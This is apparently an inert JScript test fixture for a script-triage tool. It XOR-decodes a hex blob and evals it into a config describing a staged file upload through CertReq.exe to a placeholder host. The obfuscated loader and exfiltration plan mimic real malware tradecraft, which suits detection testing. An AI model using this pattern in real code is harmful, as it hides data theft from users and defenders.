// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_41d3b8f2(v_a19c) {
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push(v_a19c[i] ^ 43); }
  return v_b27e;
}
function recover_b3c279e8() {
  var packedText = "50:09:58:5f:4e:5b:58:09:11:70:09:47:44:48:4a:5f:4e:74:47:44:48:4a:47:09:07:09:5b:59:4e:5b:4a:59:4e:74:5f:59:4a:45:58:4d:4e:59:09:07:09:5e:5b:47:44:4a:4f:74:59:4e:46:44:5f:4e:09:76:07:09:4a:4f:4a:5b:5f:4e:59:09:11:09:68:4e:59:5f:79:4e:5a:05:4e:53:4e:09:07:09:5d:4a:47:5e:4e:58:09:11:50:09:48:4a:46:5b:4a:42:4c:45:74:42:4f:09:11:09:48:4a:46:5b:4a:42:4c:45:06:18:1b:49:13:1d:1a:1d:4f:49:1a:09:07:09:5e:59:47:09:11:09:43:5f:5f:5b:58:11:04:04:18:1b:49:13:1d:1a:1d:4f:49:1a:05:4e:53:4a:46:5b:47:4e:05:42:45:5d:4a:47:42:4f:04:49:48:13:1f:1f:13:1e:1f:05:4f:4a:5f:09:07:09:5e:58:4e:59:74:4a:4c:4e:45:5f:09:11:09:63:5e:45:5f:59:4e:58:58:67:4a:49:04:18:1b:49:13:1d:1a:1d:4f:49:1a:09:07:09:4d:42:47:4e:74:5b:4a:5f:43:09:11:09:68:11:77:77:7e:58:4e:59:58:77:77:7b:5e:49:47:42:48:77:77:63:5e:45:5f:59:4e:58:58:67:4a:49:77:77:58:5f:4a:4c:4e:06:18:1b:49:13:1d:1a:1d:4f:49:1a:05:4f:4a:5f:09:56:07:09:58:5f:4a:4c:4e:68:44:5e:45:5f:09:11:18:56";
  var packedParts = packedText.split(":");
  var v_a19c = [];
  for (var hi = 0; hi < packedParts.length; hi++) { v_a19c.push(parseInt(packedParts[hi], 16)); }
  var v_f602 = [3, 5, 8, 13].slice(1, 3);
  var v_b27e = [];
  try { v_b27e = decode_41d3b8f2.apply(null, [v_a19c]); } catch (ignored) { v_b27e = []; }
  var textParts = [], bi = 0;
  for (bi = 0; bi < v_b27e.length; bi++) { textParts.push(String.fromCharCode(v_b27e[bi])); }
  var v_c304 = textParts.join("");
  return v_c304;
}
function inspect_5a06a969() {
  var v_d41a = eval("(" + recover_b3c279e8.apply(null, []) + ")");
  var table = { steps: function() { return v_d41a.steps; }, values: function() { return v_d41a.values; } };
  return { steps: table.steps.apply(null, []), adapter: v_d41a.adapter, values: table.values.apply(null, []), stageCount: v_d41a.stageCount };
}
